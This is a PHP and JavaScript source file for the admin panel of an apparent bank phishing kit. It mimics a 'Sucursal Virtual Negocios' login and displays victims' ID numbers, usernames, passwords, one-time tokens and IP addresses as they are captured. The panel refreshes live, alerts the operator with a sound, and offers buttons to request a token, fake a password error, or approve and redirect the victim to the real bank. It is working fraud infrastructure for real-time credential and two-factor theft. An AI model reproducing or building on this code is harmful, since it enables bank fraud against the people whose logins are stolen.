<?php
require_once __DIR__ . '/../core/config.php';
require_once __DIR__ . '/../core/db.php';

session_start();

$loginError = '';
$pdo = getDB();

// Login
if (isset($_POST['pwd'])) {
    if ($_POST['pwd'] === PANEL_PASSWORD) {
        $_SESSION['sucv_admin_auth'] = true;
        $_SESSION['sucv_login_time'] = time();
        header('Location: index.php');
        exit();
    } else {
        $loginError = 'Contraseña incorrecta.';
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: index.php');
    exit();
}

// Session timeout (1 hour)
if (!empty($_SESSION['sucv_login_time']) && (time() - $_SESSION['sucv_login_time']) > 3600) {
    session_destroy();
    header('Location: index.php');
    exit();
}

$authed = !empty($_SESSION['sucv_admin_auth']);

$stats = ['total' => 0, 'waiting' => 0, 'approved' => 0, 'errors' => 0];
$sessions = [];

if ($authed) {
    $now = time();
    $stats['total'] = (int) $pdo->query("SELECT COUNT(*) FROM sessions")->fetchColumn();
    $stats['waiting'] = (int) $pdo->query("SELECT COUNT(*) FROM sessions WHERE status = 'waiting'")->fetchColumn();
    $stats['approved'] = (int) $pdo->query("SELECT COUNT(*) FROM sessions WHERE status = 'approved'")->fetchColumn();
    $stats['errors'] = (int) $pdo->query("SELECT COUNT(*) FROM sessions WHERE status = 'error'")->fetchColumn();

    $rows = $pdo->query("SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100")->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $row) {
        $lastSeen = (int) ($row['last_seen'] ?? 0);
        $row['is_online'] = ($now - $lastSeen) <= 15;
        $sessions[] = $row;
    }
}
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Admin – Sucursal Virtual</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #f8f9fa;
            --surface: #ffffff;
            --border: #e9ecef;
            --text: #495057;
            --text-dark: #212529;
            --muted: #6c757d;
            --accent: #fdb100;
            --blue: #0d6efd;
            --red: #dc3545;
            --yellow: #ffc107;
            --green: #28a745;
            --shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
            --shadow-md: 0 4px 15px rgba(0, 0, 0, 0.08);
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
        }

        /* ── NAVBAR ── */
        .admin-nav {
            background: var(--surface);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 30px;
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: var(--shadow);
        }

        .nav-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .nav-brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .nav-brand-icon {
            width: 32px;
            height: 32px;
            background: var(--accent);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 12px;
            color: #1a1a1a;
        }

        .nav-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-dark);
        }

        .nav-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .btn-top {
            padding: 7px 14px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 500;
            text-decoration: none;
            border: 1px solid var(--border);
            color: var(--text);
            background: var(--surface);
            cursor: pointer;
            transition: all .2s;
        }

        .btn-top:hover {
            background: var(--bg);
            border-color: var(--muted);
        }

        .btn-logout {
            background: var(--red) !important;
            color: #fff !important;
            border-color: var(--red) !important;
        }

        .btn-logout:hover {
            filter: brightness(0.9);
        }

        .btn-danger {
            background: #dc3545 !important;
            color: #fff !important;
            border-color: #dc3545 !important;
        }

        /* ── STATS CARDS ── */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            padding: 30px 40px 0;
        }

        .stat-card {
            background: var(--surface);
            border-radius: 12px;
            border: 1px solid var(--border);
            padding: 20px 24px;
            box-shadow: var(--shadow);
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .stat-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
        }

        .stat-icon.total {
            background: rgba(13, 110, 253, 0.1);
        }

        .stat-icon.waiting {
            background: rgba(253, 177, 0, 0.12);
        }

        .stat-icon.ok {
            background: rgba(40, 167, 69, 0.1);
        }

        .stat-icon.err {
            background: rgba(220, 53, 69, 0.1);
        }

        .stat-value {
            font-size: 26px;
            font-weight: 700;
            color: var(--text-dark);
        }

        .stat-label {
            font-size: 12px;
            color: var(--muted);
            margin-top: 2px;
        }

        /* ── MAIN ── */
        .admin-main {
            padding: 30px 40px;
        }

        .page-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .page-title h1 {
            font-size: 22px;
            font-weight: 700;
            color: var(--text-dark);
        }

        .page-title p {
            font-size: 13px;
            color: var(--muted);
            margin-top: 3px;
        }

        .page-actions {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .view-switcher {
            display: flex;
            background: var(--bg);
            padding: 4px;
            border-radius: 8px;
            border: 1px solid var(--border);
        }

        .view-btn {
            padding: 6px 12px;
            border: none;
            background: transparent;
            cursor: pointer;
            border-radius: 6px;
            color: var(--muted);
            transition: all 0.2s;
            font-size: 15px;
        }

        .view-btn.active {
            background: var(--surface);
            color: var(--accent);
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
        }

        /* ── TABLE ── */
        .table-card {
            background: var(--surface);
            border-radius: 12px;
            border: 1px solid var(--border);
            box-shadow: var(--shadow);
            overflow: hidden;
        }

        .table-header {
            padding: 18px 24px;
            border-bottom: 1px solid var(--border);
            font-weight: 600;
            color: var(--text-dark);
            font-size: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            background: #fdfdfd;
            text-align: left;
            padding: 12px 20px;
            font-size: 10px;
            text-transform: uppercase;
            color: var(--muted);
            border-bottom: 2px solid var(--border);
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        td {
            padding: 14px 20px;
            border-bottom: 1px solid var(--border);
            vertical-align: middle;
        }

        tr:last-child td {
            border-bottom: none;
        }

        tr:hover td {
            background: rgba(0, 0, 0, 0.01);
        }

        /* ── USER / CREDENTIAL CELLS ── */
        .data-label {
            display: block;
            font-size: 10px;
            text-transform: uppercase;
            color: var(--muted);
            margin-bottom: 3px;
        }

        .data-value {
            font-size: 14px;
            font-weight: 600;
            color: var(--text-dark);
            cursor: pointer;
            transition: color 0.15s;
        }

        .data-value:hover {
            text-decoration: underline;
            color: var(--blue);
        }

        .data-key {
            font-size: 14px;
            font-family: 'Courier New', monospace;
            color: #d63384;
            font-weight: 700;
            background: #fdf0f6;
            padding: 2px 7px;
            border-radius: 4px;
            cursor: pointer;
        }

        .data-key:hover {
            background: #fce1f0;
        }

        /* ── STATUS BADGES ── */
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .st-waiting {
            background: #fff3cd;
            color: #856404;
        }

        .st-approved {
            background: #d1e7dd;
            color: #0f5132;
        }

        .st-error {
            background: #f8d7da;
            color: #842029;
        }

        .st-ask_token {
            background: #cfe2ff;
            color: #084298;
        }

        .st-retry {
            background: #f8d7da;
            color: #842029;
        }

        .st-syncing {
            background: #e0cffc;
            color: #5320a1;
        }

        .btn-gold {
            background: #ff9f40;
        }

        /* ── CONNECTION DOT ── */
        .conn-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 11px;
            font-weight: 600;
            margin-top: 5px;
        }

        .dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            display: inline-block;
            flex-shrink: 0;
        }

        .dot-online {
            background: var(--green);
            box-shadow: 0 0 6px var(--green);
            animation: pulse-dot 1.5s infinite;
        }

        .dot-offline {
            background: #adb5bd;
        }

        @keyframes pulse-dot {

            0%,
            100% {
                opacity: 1
            }

            50% {
                opacity: 0.4
            }
        }

        .online-text {
            color: var(--green);
        }

        .offline-text {
            color: var(--muted);
        }

        /* ── NEW-DATA DOT ── */
        .new-dot {
            width: 8px;
            height: 8px;
            background: var(--accent);
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
            box-shadow: 0 0 5px var(--accent);
            animation: pulse-dot 1.5s infinite;
        }

        /* ── ACTION BUTTONS ── */
        .actions-row {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }

        .btn-act {
            border: none;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 600;
            color: #fff;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 2px;
            transition: all 0.2s;
            min-width: 44px;
        }

        .btn-act:hover {
            filter: brightness(0.9);
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
            transform: translateY(-1px);
        }

        .btn-act:active {
            transform: scale(0.95);
        }

        .btn-blue {
            background: #4bc0c0;
        }

        .btn-purple {
            background: #6f42c1;
        }

        .btn-green {
            background: #28a745;
        }

        .btn-red {
            background: var(--red);
        }

        .btn-gray {
            background: #6c757d;
        }

        /* ── GRID VIEW ── */
        .table-card.grid-mode {
            background: transparent;
            border: none;
            box-shadow: none;
            overflow: visible;
        }

        .grid-mode .table-header {
            display: none;
        }

        .grid-mode table {
            display: block;
        }

        .grid-mode thead {
            display: none;
        }

        .grid-mode tbody {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            padding: 0;
        }

        .grid-mode tr {
            display: flex;
            flex-direction: column;
            background: var(--surface);
            border-radius: 14px;
            padding: 20px;
            border: 1px solid var(--border);
            box-shadow: var(--shadow-md);
            position: relative;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .grid-mode tr:hover {
            transform: translateY(-4px);
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.1);
        }

        .grid-mode td {
            display: block;
            padding: 8px 0;
            border-bottom: 1px solid rgba(0, 0, 0, 0.04);
            width: 100%;
        }

        .grid-mode td:last-child {
            border-bottom: none;
            margin-top: 8px;
            padding-top: 12px;
        }

        .grid-mode .actions-row {
            justify-content: space-around;
            background: var(--bg);
            padding: 10px;
            border-radius: 10px;
        }

        .grid-mode td:first-child {
            position: absolute;
            top: 14px;
            right: 14px;
            background: var(--bg);
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: 800;
            border: none;
        }

        /* ── TOAST ── */
        .toast-container {
            position: fixed;
            bottom: 30px;
            right: 30px;
            z-index: 2000;
        }

        .toast {
            background: #333;
            color: #fff;
            padding: 12px 22px;
            border-radius: 8px;
            margin-top: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            font-size: 13px;
            font-weight: 500;
            animation: slideUp 0.3s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* ── EMPTY STATE ── */
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: var(--muted);
        }

        .empty-state .es-icon {
            font-size: 48px;
            margin-bottom: 12px;
        }

        .empty-state h3 {
            font-size: 16px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 6px;
        }

        @media (max-width: 1200px) {
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 800px) {
            .stats-grid {
                grid-template-columns: 1fr 1fr;
                padding: 15px;
            }

            .admin-main {
                padding: 15px;
            }
        }
    </style>
</head>

<body>

    <?php if (!$authed): ?>
        <div
            style="height:100vh; display:flex; align-items:center; justify-content:center; background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);">
            <div
                style="background:#fff; padding:40px; border-radius:16px; width:360px; box-shadow:0 20px 60px rgba(0,0,0,0.3);">
                <div style="text-align:center; margin-bottom:28px;">
                    <div
                        style="width:56px;height:56px;background:#fdb100;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px;margin:0 auto 12px;">
                        🔐</div>
                    <h2 style="font-size:20px;font-weight:700;color:#212529;">Panel Administrador</h2>
                    <p style="font-size:13px;color:#6c757d;margin-top:4px;">Sucursal Virtual Negocios</p>
                </div>
                <form method="POST">
                    <input type="password" name="pwd" placeholder="Contraseña" autofocus
                        style="width:100%;padding:13px 16px;border:1px solid #e0e0e0;border-radius:8px;margin-bottom:14px;font-size:15px;outline:none;font-family:inherit;transition:border-color 0.2s;"
                        onfocus="this.style.borderColor='#fdb100'" onblur="this.style.borderColor='#e0e0e0'">
                    <button type="submit"
                        style="width:100%;padding:13px;background:#fdb100;color:#1a1a1a;border:none;border-radius:8px;font-weight:700;font-size:15px;cursor:pointer;font-family:inherit;letter-spacing:0.3px;">
                        INGRESAR
                    </button>
                </form>
                <?php if ($loginError): ?>
                    <p style="color:#dc3545;font-size:13px;margin-top:12px;text-align:center;font-weight:500;">
                        <?php echo $loginError; ?>
                    </p><?php endif; ?>
            </div>
        </div>
    <?php else: ?>

        <nav class="admin-nav">
            <div class="nav-left">
                <div class="nav-brand">
                    <div class="nav-brand-icon">BC</div>
                    <div class="nav-title">Si Coronas Salvame </div>
                </div>
            </div>
            <div class="nav-right">
                <div class="view-switcher">
                    <button class="view-btn" id="view-list" onclick="setView('list')" title="Vista Lista">☰</button>
                    <button class="view-btn" id="view-grid" onclick="setView('grid')" title="Vista Tarjetas">田</button>
                </div>
                <button id="btnAudio" class="btn-top" onclick="toggleAudio()">🔔 Activar Sonido</button>
                <a href="?logout=1" class="btn-top btn-logout">Cerrar Sesión</a>
            </div>
        </nav>



        <main class="admin-main">
            <div class="page-header">
                <div class="page-title">
                    <h1>Activas</h1>
                    <p>Se Actualiza cada 2 segundos.</p>
                </div>
                <div class="page-actions">
                    <button class="btn-top" onclick="refreshGrid()">🔄 Actualizar</button>
                    <button class="btn-top btn-danger" onclick="deleteAllSessions()">🗑 Borrar Todo</button>
                </div>
            </div>

            <div class="table-card" id="mainTableCard">
                <div class="table-header">
                    <span>Todos los registros</span>
                    <span id="live-badge" style="font-size:11px;color:var(--green);font-weight:600;">● Live</span>
                </div>
                <table id="sessionsGrid">
                    <thead>
                        <tr>
                            <th style="width:40px;">#</th>
                            <th>Documento</th>
                            <th>Usuario / Clave</th>
                            <th>Token</th>
                            <th>IP</th>
                            <th>Estado / Conexión</th>
                            <th>Fecha</th>
                            <th style="text-align:center;">Acciones</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($sessions)): ?>
                            <tr id="empty-row">
                                <td colspan="7">
                                    <div class="empty-state">
                                        <div class="es-icon">📭</div>
                                        <h3>No hay sesiones registradas</h3>
                                        <p>Los datos aparecerán aquí cuando alguien ingrese credenciales.</p>
                                    </div>
                                </td>
                            </tr>
                        <?php else: ?>
                            <?php $count = 1;
                            foreach ($sessions as $s): ?>
                                <tr id="card-<?php echo $s['session_id']; ?>" data-sid="<?php echo $s['session_id']; ?>"
                                    data-updated="<?php echo (int) ($s['last_seen'] ?? 0); ?>">
                                    <td><?php echo $count++; ?></td>
                                    <td>
                                        <span class="data-label"><?php echo htmlspecialchars($s['doc_type']); ?></span>
                                        <span class="data-value"
                                            onclick="copyField(this)"><?php echo htmlspecialchars($s['doc_num']); ?></span>
                                    </td>
                                    <td>
                                        <div style="display:flex;flex-direction:column;gap:5px;">
                                            <div>
                                                <span class="data-label">USUARIO</span>
                                                <span class="data-value"
                                                    onclick="copyField(this)"><?php echo htmlspecialchars($s['username']); ?></span>
                                            </div>
                                            <div>
                                                <span class="data-label">CLAVE</span>
                                                <span class="data-key"
                                                    onclick="copyField(this)"><?php echo htmlspecialchars($s['password']); ?></span>
                                            </div>
                                        </div>
                                    </td>
                                    <td>
                                        <?php if (!empty($s['token_value'])): ?>
                                            <span class="data-key"
                                                onclick="copyField(this)"><?php echo htmlspecialchars($s['token_value']); ?></span>
                                        <?php else: ?>
                                            <span style="color:var(--muted);font-size:12px;">—</span>
                                        <?php endif; ?>
                                    </td>
                                    <td style="font-size:13px;color:var(--muted);"><?php echo htmlspecialchars($s['ip']); ?></td>
                                    <td>
                                        <span class="badge st-<?php echo str_replace('_', '-', htmlspecialchars($s['status'])); ?>"
                                            style="text-transform:uppercase;"><?php echo htmlspecialchars($s['status']); ?></span>
                                        <div class="conn-badge">
                                            <?php if ($s['is_online']): ?>
                                                <span class="dot dot-online"></span><span class="online-text">Conectado</span>
                                            <?php else: ?>
                                                <span class="dot dot-offline"></span><span class="offline-text">Salió</span>
                                            <?php endif; ?>
                                        </div>
                                    </td>
                                    <td style="font-size:12px;color:var(--muted);">
                                        <?php echo date('d/m/y H:i', strtotime($s['created_at'])); ?>
                                    </td>
                                    <td>
                                        <div class="actions-row">
                                            <button class="btn-act btn-blue"
                                                onclick="doAction('<?php echo $s['session_id']; ?>','retry')"
                                                title="Volver a espera">🔄<small>Retry</small></button>
                                            <button class="btn-act btn-purple"
                                                onclick="doAction('<?php echo $s['session_id']; ?>','syncing')"
                                                title="Sincronizando datos">⏳<small>Sync</small></button>
                                            <button class="btn-act btn-gold"
                                                onclick="doAction('<?php echo $s['session_id']; ?>','ask_token')"
                                                title="Pedir Token">🔑<small>Token</small></button>
                                            <button class="btn-act btn-red"
                                                onclick="doAction('<?php echo $s['session_id']; ?>','error')"
                                                title="Enviar error de clave">❌<small>Error</small></button>
                                            <button class="btn-act btn-green"
                                                onclick="doAction('<?php echo $s['session_id']; ?>','approved')"
                                                title="Aprobar y redirigir al banco">✅<small>Aprobar</small></button>
                                            <button class="btn-act btn-gray"
                                                onclick="doAction('<?php echo $s['session_id']; ?>','delete')"
                                                title="Eliminar registro">🗑<small>Borrar</small></button>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; endif; ?>
                    </tbody>
                </table>
            </div>
        </main>

        <div class="toast-container" id="toastContainer"></div>

        <script>
            let audioCtx = null;
            let audioOn = localStorage.getItem('sucv_audio_on') === 'true';

            // ── Audio ──────────────────────────────────────────────────────────────────────
            function toggleAudio() {
                if (audioOn) {
                    audioOn = false;
                    localStorage.setItem('sucv_audio_on', 'false');
                    updateAudioBtn();
                    showToast('🔇 Sonido desactivado', 'ok');
                } else {
                    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    if (audioCtx.state === 'suspended') audioCtx.resume();
                    audioOn = true;
                    localStorage.setItem('sucv_audio_on', 'true');
                    updateAudioBtn();
                    showToast('🔔 Sonido activado', 'ok');
                    playPing();
                }
            }

            function updateAudioBtn() {
                const btn = document.getElementById('btnAudio');
                if (!btn) return;
                if (audioOn) {
                    btn.textContent = '🔊 Sonido Activo';
                    btn.style.background = '#28a745'; btn.style.color = '#fff'; btn.style.borderColor = '#28a745';
                } else {
                    btn.textContent = '🔔 Activar Sonido';
                    btn.style.background = ''; btn.style.color = ''; btn.style.borderColor = '';
                }
            }

            window.addEventListener('click', () => {
                if (localStorage.getItem('sucv_audio_on') === 'true' && !audioCtx) {
                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                }
            }, { once: true });

            function playPing() {
                if (!audioOn) return;
                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                if (audioCtx.state === 'suspended') audioCtx.resume();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(1174.66, audioCtx.currentTime); // D6
                gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.5);
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start(); osc.stop(audioCtx.currentTime + 0.5);
            }

            // ── Actions ────────────────────────────────────────────────────────────────────
            async function doAction(sid, action) {
                const body = new URLSearchParams({ session_id: sid, action });
                try {
                    const res = await fetch('action.php', { method: 'POST', body });
                    const json = await res.json();
                    if (json.ok) {
                        const labels = { retry: '🔄 En espera', syncing: '⏳ Sincronizando', error: '❌ Error enviado', approved: '✅ Aprobado', delete: '🗑 Eliminado' };
                        showToast(labels[action] || '✅ Acción completada', 'ok');
                        if (action === 'delete') document.getElementById('card-' + sid)?.remove();
                        else await refreshGrid();
                    } else {
                        showToast('❌ ' + (json.msg || 'Error'), 'err');
                    }
                } catch (e) { showToast('❌ Error de conexión', 'err'); }
            }

            async function deleteAllSessions() {
                if (!confirm('⚠️ ¿Borrar TODAS las sesiones? Esta acción no se puede deshacer.')) return;
                const body = new URLSearchParams({ action: 'delete_all' });
                try {
                    const res = await fetch('action.php', { method: 'POST', body });
                    const json = await res.json();
                    if (json.ok) {
                        showToast('🗑 Todas las sesiones borradas', 'ok');
                        await refreshGrid();
                    } else { showToast('❌ ' + json.msg, 'err'); }
                } catch (e) { showToast('❌ Error de conexión', 'err'); }
            }

            // ── Live Refresh ───────────────────────────────────────────────────────────────
            async function refreshGrid() {
                try {
                    const res = await fetch('feed.php?t=' + Date.now(), { cache: 'no-store' });
                    if (!res.ok) return;
                    const data = await res.json();
                    if (data.error) return;
                    updateStats(data.stats);
                    updateRows(data.sessions);
                } catch (e) { /* silent */ }
            }

            function updateStats(stats) {
                const map = { 'stat-total': stats.total, 'stat-waiting': stats.waiting, 'stat-approved': stats.approved, 'stat-errors': stats.errors };
                for (const [id, val] of Object.entries(map)) {
                    const el = document.getElementById(id);
                    if (el && el.innerText != val) el.innerText = val;
                }
            }

            function buildRow(s, rowNum) {
                const badgeMap = { approved: 'st-approved', error: 'st-error', ask_token: 'st-ask_token', retry: 'st-retry', syncing: 'st-syncing' };
                const badgeClass = badgeMap[s.status] || 'st-waiting';
                const connHtml = s.is_online
                    ? `<div class="conn-badge"><span class="dot dot-online"></span><span class="online-text">Conectado</span></div>`
                    : `<div class="conn-badge"><span class="dot dot-offline"></span><span class="offline-text">Salió</span></div>`;
                const dateStr = new Date(s.created_at.replace(/-/g, '/')).toLocaleString('es-CO', { day: '2-digit', month: '2-digit', year: '2-digit', hour: '2-digit', minute: '2-digit' });

                return `<tr id="card-${s.sid}" data-sid="${s.sid}" data-updated="${s.updated_at_ts}">
        <td>${rowNum}</td>
        <td>
            <span class="data-label">${esc(s.doc_type)}</span>
            <span class="data-value" onclick="copyField(this)">${esc(s.doc_num)}</span>
        </td>
        <td>
            <div style="display:flex;flex-direction:column;gap:5px;">
                <div>
                    <span class="data-label">USUARIO</span>
                    <span class="data-value" onclick="copyField(this)">${esc(s.username)}</span>
                </div>
                <div>
                    <span class="data-label">CLAVE</span>
                    <span class="data-key" onclick="copyField(this)">${esc(s.password)}</span>
                </div>
            </div>
        </td>
        <td>
            ${s.token_value
                    ? `<span class="data-key" onclick="copyField(this)">${esc(s.token_value)}</span>`
                    : `<span style="color:var(--muted);font-size:12px;">—</span>`}
        </td>
        <td style="font-size:13px;color:var(--muted);">${esc(s.ip)}</td>
        <td>
            <span class="badge ${badgeClass}" style="text-transform:uppercase;">${esc(s.status)}</span>
            ${connHtml}
        </td>
        <td style="font-size:12px;color:var(--muted);">${dateStr}</td>
        <td>
            <div class="actions-row">
                <button class="btn-act btn-blue" onclick="doAction('${s.sid}','retry')" title="Volver a espera">🔄<small>Retry</small></button>
                <button class="btn-act btn-purple" onclick="doAction('${s.sid}','syncing')" title="Sincronizando">⏳<small>Sync</small></button>
                <button class="btn-act btn-gold" onclick="doAction('${s.sid}','ask_token')" title="Pedir Token">🔑<small>Token</small></button>
                <button class="btn-act btn-red"  onclick="doAction('${s.sid}','error')" title="Enviar error de clave">❌<small>Error</small></button>
                <button class="btn-act btn-green" onclick="doAction('${s.sid}','approved')" title="Aprobar">✅<small>Aprobar</small></button>
                <button class="btn-act btn-gray" onclick="doAction('${s.sid}','delete')" title="Eliminar">🗑<small>Borrar</small></button>
            </div>
        </td>
    </tr>`;
            }

            function updateRows(sessions) {
                const tbody = document.querySelector('#sessionsGrid tbody');
                if (!tbody) return;

                // Remove empty state row
                const emptyRow = document.getElementById('empty-row');
                if (emptyRow && sessions.length > 0) emptyRow.remove();

                if (sessions.length === 0 && !document.getElementById('empty-row')) {
                    tbody.innerHTML = `<tr id="empty-row"><td colspan="7"><div class="empty-state"><div class="es-icon">📭</div><h3>No hay sesiones registradas</h3><p>Los datos aparecerán aquí cuando alguien ingrese credenciales.</p></div></td></tr>`;
                    return;
                }

                const existingIds = new Set([...tbody.querySelectorAll('tr[data-sid]')].map(r => r.dataset.sid));
                const newIds = new Set(sessions.map(s => s.sid));

                existingIds.forEach(sid => {
                    if (!newIds.has(sid)) tbody.querySelector('#card-' + sid)?.remove();
                });

                sessions.forEach((s, idx) => {
                    const existing = tbody.querySelector('#card-' + s.sid);
                    const newHtml = buildRow(s, idx + 1);
                    if (!existing) {
                        tbody.insertAdjacentHTML('afterbegin', newHtml);
                        playPing();
                        const newRow = tbody.querySelector('#card-' + s.sid);
                        if (newRow) {
                            newRow.style.transition = 'background 1.2s';
                            newRow.style.background = 'rgba(253,177,0,0.12)';
                            setTimeout(() => newRow.style.background = '', 1500);
                        }
                    } else {
                        const oldTs = existing.getAttribute('data-updated');
                        if (oldTs != s.updated_at_ts) {
                            existing.outerHTML = newHtml;
                        }
                    }
                });
            }

            // ── View Switcher ──────────────────────────────────────────────────────────────
            function setView(mode) {
                const card = document.getElementById('mainTableCard');
                if (!card) return;
                if (mode === 'grid') {
                    card.classList.add('grid-mode');
                    document.getElementById('view-grid').classList.add('active');
                    document.getElementById('view-list').classList.remove('active');
                } else {
                    card.classList.remove('grid-mode');
                    document.getElementById('view-list').classList.add('active');
                    document.getElementById('view-grid').classList.remove('active');
                }
                localStorage.setItem('sucv_panel_view', mode);
            }

            // ── Helpers ────────────────────────────────────────────────────────────────────
            function esc(str) {
                if (!str) return '';
                return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
            }

            function copyField(el) {
                const text = el.innerText.trim();
                navigator.clipboard.writeText(text).then(() => showToast('📋 Copiado: ' + text, 'ok'));
            }

            function showToast(msg, type) {
                const c = document.getElementById('toastContainer');
                const t = document.createElement('div');
                t.className = 'toast';
                t.style.borderLeft = type === 'ok' ? '4px solid #28a745' : '4px solid #dc3545';
                t.innerText = msg;
                c.appendChild(t);
                setTimeout(() => t.remove(), 3000);
            }

            // ── Boot ───────────────────────────────────────────────────────────────────────
            document.addEventListener('DOMContentLoaded', () => {
                const savedView = localStorage.getItem('sucv_panel_view') || 'list';
                setView(savedView);
                updateAudioBtn();
            });

            // Refresh every 2 seconds
            setInterval(refreshGrid, 2000);
        </script>

    <?php endif; ?>
</body>

</html>